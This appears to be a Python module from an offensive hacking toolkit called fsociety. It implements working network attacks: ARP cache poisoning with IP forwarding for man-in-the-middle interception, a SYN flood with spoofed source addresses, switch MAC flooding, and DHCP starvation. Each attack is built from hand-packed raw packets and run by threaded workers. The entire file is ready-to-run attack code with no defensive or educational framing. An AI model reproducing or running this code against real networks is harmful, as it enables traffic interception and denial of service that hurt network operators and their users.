from __future__ import annotations

import os
import random
import socket
import struct
import threading
import time

from fsociety.core.base import tool
from fsociety.core.logger import Log

@tool("netattack", "ARP poisoning, SYN flood, MAC flooding, DHCP starvation", category="network")
class NetAttack:
    @staticmethod
    def build_parser(p):
        sub = p.add_subparsers(dest="cmd", required=True)
        arp = sub.add_parser("arp", help="ARP cache poisoning (requires root)")
        arp.add_argument("interface", help="e.g., eth0")
        arp.add_argument("target_ip")
        arp.add_argument("gateway_ip")
        arp.add_argument("--duration", type=int, default=60)
        arp.add_argument("--forward", action="store_true", help="Enable IP forwarding")

        syn = sub.add_parser("syn", help="Raw SYN flood (requires root)")
        syn.add_argument("target")
        syn.add_argument("port", type=int)
        syn.add_argument("--duration", type=int, default=60)
        syn.add_argument("--threads", type=int, default=4)

        mac = sub.add_parser("mac", help="MAC flooding / CAM table exhaustion")
        mac.add_argument("interface")
        mac.add_argument("--duration", type=int, default=60)

        dhcp = sub.add_parser("dhcp", help="DHCP starvation (requires root)")
        dhcp.add_argument("interface")
        dhcp.add_argument("--duration", type=int, default=60)

    @staticmethod
    def _get_mac(interface: str) -> str:
        try:
            with open(f"/sys/class/net/{interface}/address") as f:
                return f.read().strip()
        except OSError:
            return "00:11:22:33:44:55"

    @staticmethod
    def _checksum(data: bytes) -> int:
        if len(data) % 2: data += b"\x00"
        s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        return ~s & 0xffff

    @staticmethod
    def _arp_packet(src_mac: str, src_ip: str, dst_mac: str, dst_ip: str) -> bytes:
        eth = struct.pack("!6s6sH", bytes.fromhex(dst_mac.replace(":", "")), bytes.fromhex(src_mac.replace(":", "")), 0x0806)
        arp = struct.pack("!HHBBH6s4s6s4s", 1, 0x0800, 6, 4, 2, bytes.fromhex(src_mac.replace(":", "")), socket.inet_aton(src_ip), bytes.fromhex(dst_mac.replace(":", "")), socket.inet_aton(dst_ip))
        return eth + arp

    @staticmethod
    def _syn_packet(src_ip: str, dst_ip: str, dst_port: int) -> bytes:
        sport = random.randint(1024, 65535)
        seq = random.randint(0, 0xffffffff)
        tcp = struct.pack("!HHLLBBHHH", sport, dst_port, seq, 0, 5 << 4, 0x02, 8192, 0, 0)
        pseudo = socket.inet_aton(src_ip) + socket.inet_aton(dst_ip) + struct.pack("!BBH", 0, 6, len(tcp))
        chk = NetAttack._checksum(pseudo + tcp)
        tcp = tcp[:16] + struct.pack("!H", chk) + tcp[18:]
        ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, random.randint(0, 65535), 0, 64, 6, 0, socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
        ip_chk = NetAttack._checksum(ip)
        ip = ip[:10] + struct.pack("!H", ip_chk) + ip[12:]
        return ip + tcp

    @staticmethod
    def _arp_worker(interface: str, target_ip: str, gateway_ip: str, duration: int, forward: bool, stop_event: threading.Event):
        if os.geteuid() != 0: return
        if forward: os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
        try:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
            s.bind((interface, 0))
        except PermissionError: return
        my_mac = NetAttack._get_mac(interface)
        while not stop_event.is_set():
            pkt1 = NetAttack._arp_packet(my_mac, gateway_ip, "ff:ff:ff:ff:ff:ff", target_ip)
            pkt2 = NetAttack._arp_packet(my_mac, target_ip, "ff:ff:ff:ff:ff:ff", gateway_ip)
            try:
                s.send(pkt1)
                s.send(pkt2)
            except Exception: pass
            time.sleep(1)
        if forward: os.system("sysctl -w net.ipv4.ip_forward=0 > /dev/null 2>&1")
        s.close()

    @staticmethod
    def _syn_worker(target: str, port: int, stop_event: threading.Event):
        try: s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except PermissionError: return
        while not stop_event.is_set():
            try:
                src = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                pkt = NetAttack._syn_packet(src, target, port)
                s.sendto(pkt, (target, 0))
            except Exception: pass
        s.close()

    @staticmethod
    def _mac_worker(interface: str, stop_event: threading.Event):
        try:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
            s.bind((interface, 0))
        except PermissionError: return
        while not stop_event.is_set():
            try:
                src = bytes([random.randint(0,255) for _ in range(6)])
                dst = bytes([random.randint(0,255) for _ in range(6)])
                s.send(dst + src + b"\x08\x00" + os.urandom(100))
            except Exception: pass
        s.close()

    @staticmethod
    def _dhcp_worker(interface: str, stop_event: threading.Event):
        try:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
            s.bind((interface, 0))
        except PermissionError: return
        while not stop_event.is_set():
            try:
                fake_mac = bytes([random.randint(0,255) for _ in range(6)])
                eth = struct.pack("!6s6sH", b"\xff\xff\xff\xff\xff\xff", fake_mac, 0x0800)
                bootp = struct.pack("!BBBBIHH4s4s4s4s16s64s128s", 1, 1, 6, 0, 0x12345678, 0, 0x8000, socket.inet_aton("0.0.0.0"), socket.inet_aton("0.0.0.0"), socket.inet_aton("0.0.0.0"), socket.inet_aton("0.0.0.0"), fake_mac + b"\x00"*10, b"\x00"*64, b"\x00"*128)
                dhcp_opts = b"\x63\x82\x53\x63\x35\x01\x01\x37\x04\x01\x03\x06\x2a\xff"
                udp_len = 8 + len(bootp) + len(dhcp_opts)
                ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + udp_len, random.randint(0, 65535), 0, 128, 17, 0, socket.inet_aton("0.0.0.0"), socket.inet_aton("255.255.255.255"))
                udp = struct.pack("!HHHH", 68, 67, udp_len, 0)
                s.send(eth + ip + udp + bootp + dhcp_opts)
            except Exception: pass
        s.close()

    @staticmethod
    def run(args, log: Log) -> int:
        if args.cmd == "arp":
            if os.geteuid() != 0: return 1
            log.info(f"Poisoning {args.target_ip} <-> {args.gateway_ip} on {args.interface}")
            stop_event = threading.Event()
            t = threading.Thread(target=NetAttack._arp_worker, args=(args.interface, args.target_ip, args.gateway_ip, args.duration, args.forward, stop_event))
            t.start(); time.sleep(args.duration); stop_event.set(); t.join()
            log.ok("ARP poisoning stopped")
            return 0
        if args.cmd == "syn":
            log.info(f"SYN flood on {args.target}:{args.port}")
            stop_event = threading.Event(); threads = []
            for _ in range(args.threads):
                t = threading.Thread(target=NetAttack._syn_worker, args=(args.target, args.port, stop_event))
                t.start(); threads.append(t)
            time.sleep(args.duration); stop_event.set()
            for t in threads: t.join()
            log.ok("SYN flood stopped")
            return 0
        if args.cmd == "mac":
            log.info(f"MAC flooding on {args.interface}")
            stop_event = threading.Event()
            t = threading.Thread(target=NetAttack._mac_worker, args=(args.interface, stop_event))
            t.start(); time.sleep(args.duration); stop_event.set(); t.join()
            log.ok("MAC flooding stopped")
            return 0
        if args.cmd == "dhcp":
            if os.geteuid() != 0: return 1
            log.info(f"DHCP starvation on {args.interface}")
            stop_event = threading.Event()
            t = threading.Thread(target=NetAttack._dhcp_worker, args=(args.interface, stop_event))
            t.start(); time.sleep(args.duration); stop_event.set(); t.join()
            log.ok("DHCP starvation stopped")
            return 0
        return 2
